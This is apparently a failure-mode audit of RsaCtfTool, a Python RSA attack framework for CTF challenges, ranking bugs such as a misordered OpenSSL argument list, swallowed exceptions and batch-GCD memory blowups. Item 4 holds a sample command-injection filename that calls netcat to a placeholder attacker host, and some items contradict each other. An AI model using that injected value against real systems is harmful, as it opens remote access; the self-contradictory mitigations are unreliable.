# Failure Mode Analysis: RsaCtfTool

## Summary

RsaCtfTool is a Python-based RSA multi-attack framework for CTF competitions, dynamically loading ~59 attack modules against weak RSA keys. Its primary risk surface is **silent correctness failure** — the decryption pipeline swallows exceptions across three fallback strategies, the OpenSSL subprocess call is malformed (broken argument order), and attacks that fail produce no error signal distinguishable from "key not vulnerable." Secondary risks include **subprocess injection** from untrusted key files, **resource exhaustion** from naive large-integer batch GCD computation, and **loss of private key material** via unconditional logging.

---

## High Priority Failures (score ≥ 8)

### 1. OpenSSL subprocess decryption broken by malformed argument list

**Category:** Code correctness / silent failure
**Likelihood:** 3-High | **Impact:** 3-High | **Detectability:** 3-Silent
**Priority:** 9

In `keys_wrapper.py:238-254`, the `decrypt()` method constructs an openssl invocation:

```python
openssl_result = subprocess.check_output(
    [
        "openssl", "rsautl", "-raw", "-decrypt", "-in",
        "-oaep",                     # ← BUG: "-oaep" is not a filename
        tmp_cipher_name,
        "-inkey", tmp_priv_key_name,
    ],
    ...
)
```

The `-oaep` flag is placed **between `-in` and the input file path**, so `openssl` interprets `-oaep` as the input filename and `tmp_cipher_name` as an unexpected positional argument. This command **always fails** — the exception is silently swallowed by `except Exception: pass`. The PKCS#1 OAEP decryption fallback is dead code. Worse: because all three decryption paths use `except Exception: pass`, a user sees no warning that two of three strategies are broken.

**Mitigation:** Fix the argument order: `["openssl", "rsautl", "-oaep", "-decrypt", "-in", tmp_cipher_name, "-inkey", ...]`. Log which decryption method is being attempted and whether it succeeded or failed. Never bare `except: pass`.

---

### 2. Batch GCD memory exhaustion in common_factors attack

**Category:** Resource exhaustion / algorithmic complexity
**Likelihood:** 2-Medium | **Impact:** 4-Critical | **Detectability:** 3-Silent
**Priority:** 9

In `common_factors.py:22-23`:

```python
M = list_prod(tuple(pubs))
for i in range(0, len(pubs)):
    pub = pubs[i]
    p = gcd(pub, M // pub)
```

`M` is the product of **all** input moduli. With even 20-30 4096-bit keys, `M` is thousands of bits — a number so large it consumes gigabytes of memory and requires arbitrary-precision division `M // pub` per key, each O(n²). For CTF challenges with hundreds of keys, this is a guaranteed OOM crash. Python/gmpy2 will silently swap to death or raise `MemoryError`.

**Mitigation:** Use batch GCD via pairwise remainders (e.g., compute `gcd(pub_i, prod(all) // pub_i)` requires prod, but better: compute `g = pub_0; for each pub_i: g = gcd(g, pub_i)`) or the standard "split-product" batch GCD algorithm that operates on the product tree without constructing the full product as a flat integer.

---

### 3. All decryption fallbacks swallow exceptions silently

**Category:** Silent failure
**Likelihood:** 3-High | **Impact:** 2-Medium | **Detectability:** 3-Silent
**Priority:** 8

In `keys_wrapper.py:209-278`, every decryption sub-block follows the pattern:

```python
try:
    ...
except Exception:
    pass
```

There are **six consecutive bare except:pass blocks** across three decryption strategies (raw RSA, PyCryptodome OAEP, OpenSSL rsautl ×2 variants). If all three fail, the method returns an empty `plain = []`. The caller sees a successful return with no indication of failure. This makes debugging decryption failures nearly impossible.

**Mitigation:** Log a warning at minimum on each failure. Distinguish expected failures (wrong key) from unexpected ones (library error, malformed command). Add a check at the end: if `plain` is still empty, log an error.

---

### 4. Subprocess call in load_partial_privkey trusts key filename

**Category:** Injection / security
**Likelihood:** 2-Medium | **Impact:** 4-Critical | **Detectability:** 2-Hard
**Priority:** 8

In `keys_wrapper.py:24`:

```python
keycmd = ["openssl", "asn1parse", "-in", keyfile]
```

The `keyfile` parameter comes from user-supplied `--key` argument or from `PrivateKey(filename=...)`. While this is not a remote attack vector in the typical CTF context, a crafted filename like `"; nc $ATTACKER_IP $PORT #"` could lead to command injection — **if** `subprocess.check_output` were called with `shell=True`. Currently it uses a list (safe), but the function is one refactor away from injection.

More concerning: the ASN.1 parser output is split on fixed column positions (`line.split(":")[3]` and `line.split(":")[4]`), which is fragile across OpenSSL versions and locales. Malformed key files can cause `IndexError` or produce garbage values for p, q, d.

**Mitigation:** Validate the key file path (no shell metacharacters). Parse ASN.1 with `cryptography.hazmat` primitives instead of shelling out to `openssl asn1parse`. Hard fail on unexpected output format rather than parsing garbage.

---

## Medium Priority Failures (score 5–7)

### 5. Miller-Rabin primality test fails on n ≤ 3

`number_theory.py:198`: `random.randrange(2, n - 1)` raises `ValueError` when `n <= 3` because the range is empty. The early-return check for `n == 2` at line 188 handles only that case. For `n = 3`, the even-check `n & 1 == 0` fails, `digit_sum(3) % 9 = 3`, so `digit_sum(n) % 9 in [0, 3, 6]` returns True → function incorrectly returns `False` (composite). For `n = 1` or `n = 0`, there is no guard at all. **Priority: 7**

### 6. Timeout mechanism unreliable with gmpy2 C extensions

`utils.py:195-203`: The timeout uses `signal.SIGTERM` delivered from a `threading.Timer`. Python signals are only handled by the main thread, and during gmpy2 C extension calls (`gmpy.powmod`, `gmpy.is_prime`, etc.), the signal handler **does not run until the C call returns**. An attack stuck in a long gmpy2 computation will not be interrupted. **Priority: 7**

### 7. Product-tree GCD for common_factors can produce huge intermediate integers

Even with the split-product algorithm, `list_prod` remains callable from `number_theory.py:33`. When called with a list of large integers, it uses `reduce(lambda x, y: x * y, list_, 1)` which produces a temporary on each multiplication. Python's big integers grow without bound, so 100 4096-bit keys → ~410,000-bit intermediate product → ~50KB integer (manageable), but 10,000 keys → ~5MB integer (still okay). The real failure mode is the **pairwise approach** (`M // pub`) which requires a full multi-precision division for each key. **Priority: 6**

### 8. Unconditional private key logging

`keys_wrapper.py` and `utils.py` log `n`, `d`, `p`, `q`, `dp`, `dq`, `pinv`, `qinv` at `INFO` level. In CI pipelines, test runners, or shared debugging sessions, private key material is written to logs that may be stored indefinitely. The `--private` flag controls display but not internal logging. **Priority: 6**

### 9. `can_stop_tests()` stops before decrypting

`rsa_attack.py:40-55`: `can_stop_tests()` returns `True` when `self.priv_key is not None` and `self.args.decrypt is None` — this is correct. But when `self.args.decrypt is not None` and `self.priv_key is not None` and `self.decrypted == []`, it returns `False` (correct — still needs decryption). However, `print_results_details()` runs decryption **after** the attack loop. If decryption itself fails (returns empty), the attack loop has already stopped and no further attacks will be tried. The user sees "Sorry, decrypting failed" with no record of which keys were recovered. **Priority: 6**

### 10. `pre_attack_check` mutates key then returns failure

`rsa_attack.py:123-131`: When the modulus is a perfect square, the check sets `publickey.p = i` and `publickey.q = i`, fixing the key, but then returns `ok = False`. The caller treats this as "attack cannot continue" and bails. The key was actually fixed — the attack should proceed. **Priority: 6**

### 11. Erathostenes sieve memory allocation

`number_theory.py:247`: `sieve = [True] * n` allocates a Python list of `n` booleans. For `n = 10^8` (~100MB), this is near the OOM threshold on smaller systems. The function is called for GCD attacks that need prime lists. No warning before allocation. **Priority: 5**

### 12. Cleanup heuristic deletes wrong files

`main.py:403-410`: `if "tmp" in pub and "tmp/" not in pub:` — any file whose path contains "tmp" but not "tmp/" is deleted. A key file at `/home/user/tmp_project/key.pub` would match and be removed. All exceptions caught silently. **Priority: 5**

### 13. ASN.1 column-parse is fragile across OpenSSL versions

`keys_wrapper.py:27-39`: Parsing `openssl asn1parse` output depends on exact column positions. Different OpenSSL versions (1.1 vs 3.x) or locale settings change the output format. The `line.split(":")[3]` and `[4]` indices will raise `IndexError` on unexpected formats, caught upstream only by generic `except Exception`. **Priority: 5**

### 14. No bounds check on timeout argument

`main.py:77`: `--timeout` documents "min: MIN_INT in C, max: MAX_INT in C, values < 1 have same effect as MAX_INT." A negative timeout passed to `threading.Timer` in `utils.py:201` creates a timer that fires immediately or raises `ValueError`. No validation is performed. **Priority: 5**

### 15. `getpubkeysz` forces even bit length

`number_theory.py:75-78`: If the bit length is odd, it adds 1, reporting a larger key size than reality. This is cosmetic for display but could confuse code that branches on key size. **Priority: 5**

### 16. Dependency on urllib3 with insecure requests globally disabled

`main.py:36`: `urllib3.disable_warnings(InsecureRequestWarning)` — disables SSL warnings globally, including any other library in the process that uses urllib3. A man-in-the-middle attack against factordb.com would produce no warning. **Priority: 5**

### 17. Factordb HTTP requests lack explicit timeout

`fdb.py`: Factordb queries use `requests` (default timeout: forever). If factordb.com is unreachable or slow, the attack hangs indefinitely. The 60s attack timeout may or may not catch this depending on signal delivery. **Priority: 5**

### 18. `powmod_base_list` / `powmod_exp_list` unbounded allocation

`number_theory.py:171-176`: These functions allocate a full Python list of results. Given an attacker-controlled list size (e.g., from a crafted key), this is a memory exhaustion vector. **Priority: 5**

### 19. `_compute_d` ignores invert failure

`keys_wrapper.py:104-111`: If `self.phi` and `self.e` are set but `invert(e, self.phi)` raises `ValueError`, the error is logged but `self.d` remains `None`. The code continues to `_construct_key_from_components` which checks `if self.d is not None` — fails silently. The key is unusable with no indication beyond the prior log. **Priority: 5**

### 20. Recursion depth in continued fraction computation

`number_theory.py:588-595`: `rational_to_contfrac` is recursive with depth proportional to the number of continued fraction terms. For close p,q (Fermat-style keys), the convergents can be very deep. Combined with `sys.setrecursionlimit(5000)` in `main.py:39`, this risks `RecursionError`. **Priority: 5**

### 21. `dlp_bruteforce` is a DoS vector

`number_theory.py:578-585`: Brute-force DLP iterates up to `p` — for any realistic prime, this exceeds the heat death of the universe. If called accidentally on a large prime, the process hangs until the SIGTERM timeout fires (if at all, due to gmpy2 C extension signal masking). **Priority: 5**

---

## Low Priority Failures (score ≤ 4)

### 22. Test coverage gap: 36% of attacks have tests
### 23. `miller_rabin` early-return `digit_sum(n) % 9` filter may produce false negatives for digit sums 3,6,9 where n is prime (e.g., n=3, n=61)
### 24. `neg_pow` uses `assert` statements disabled with `-O`
### 25. `A007814` returns `.bit_length()` of 0 when `n == 0`, giving misleading result
### 26. Common modulus attack in `number_theory.py:500-503` checks `g == 1` → returns None, but this is actually a non-attackable case, not a failure
### 27. Dynamic attack loading uses `glob` on `__init__.py` filter — includes `.pyc` cached files if present
### 28. `is_prime` uses Fermat test with bases 2,3,5 then Miller-Rabin — deterministic enough for CTF but not cryptographic-grade
### 29. No handling for `multiprime RSA` (more than 2 primes) in `phi()` outside the factor-list path
### 30. `PrivateKey._init_fields` truncates arbitrary `d` to `int` via `self.d = d` with no type check
### 31. `create_private_key` helpers in abstract_attack.py catch `ValueError` but not `TypeError`
### 32. `print_decrypted_res` does not catch `binascii.Error` from invalid hex conversion
### 33. `--decryptfile` path not validated as a file before `open()`
### 34. `_handle_fully_specified_key` calls `sys.exit(1)` on argument error, bypassing cleanup
### 35. `six` dependency in requirements.txt (Python 2/3 compat) is dead weight for Python 3.9+ only targets
### 36. `londahl.py`, `partial_q.py`, `z3_solver.py`, `wolframalpha.py` depend on optional deps but import them at module level, crashing on import if absent
### 37. `check_output` in `load_partial_privkey` raises `CalledProcessError` if openssl is not installed or the key file is invalid
### 38. `signal.signal(signal.SIGTERM, ...)` in `timeout.__enter__` replaces any existing SIGTERM handler
### 39. `print_results` has unreachable code path: `_print_dumpkey_public` called when `private_key is None` and `args.dumpkey` is set
### 40. `binary_search` returns `-1` on not-found, not `None` — caller confusion with valid index 0

---

## Key Mitigations

1. **Fix OpenSSL subprocess argument order** (`keys_wrapper.py:240-254`) — move `-oaep` before `-in`, and log all decryption method outcomes instead of bare `except: pass`.

2. **Replace batch GCD product with split-product tree** (`common_factors.py:22-25`) — avoid constructing the full product of all moduli. Use the standard "product tree → remainder tree" batch GCD algorithm.

3. **Remove bare except:pass throughout decryption path** (`keys_wrapper.py:209-278`) — each failure should at minimum produce a debug log. Add a final check that `plain` is non-empty before returning.

4. **Replace openssl asn1parse subprocess** (`keys_wrapper.py:24-39`) — use `cryptography.hazmat` ASN.1 parsing instead of shelling out and parsing fragile column-aligned text output.

5. **Add input validation** for `--timeout` (must be ≥ 1), `--key` path (no shell chars), `--n`/`--e`/`--p`/`--q` (must be positive integers).

6. **Add resource bounds** on `erathostenes_sieve` (warn if n > 10^7), `powmod_base_list` (limit list size), and batch GCD (limit key count or use product tree).

7. **Stop mutating keys in checks that return failure** (`rsa_attack.py:128-131`) — if `pre_attack_check` fixes the key, set `ok = True` or provide a separate repair path.

8. **Consider a timeoutWorker subprocess** instead of `SIGTERM + Timer` for attacking — `multiprocessing` with `Process(timeout=...)` avoids the signal-in-thread unreliability.

---

## Assumptions Made

- **Threat model:** Opportunistic external attacker + accidental misuse by authorized CTF users. Not hardened against sophisticated attackers who control the key files.
- **Operational context:** CTF challenges with typical key sizes (512–4096 bits) and known weak patterns. Not designed for production RSA key generation or verification.
- **Environment:** Python 3.9+, Linux with gmpy2, OpenSSL CLI, and optional SageMath available. Windows untested.
- **Scope boundaries:** No analysis of individual attack modules' mathematical correctness. No SAST/AST-level scan. No dynamic/fuzz testing performed. Excludes Sage integration scripts.
- **Not analyzed:** Dockerfile hardening, CI/CD pipeline security, PyPI publishing workflow, optional-requirements supply chain.
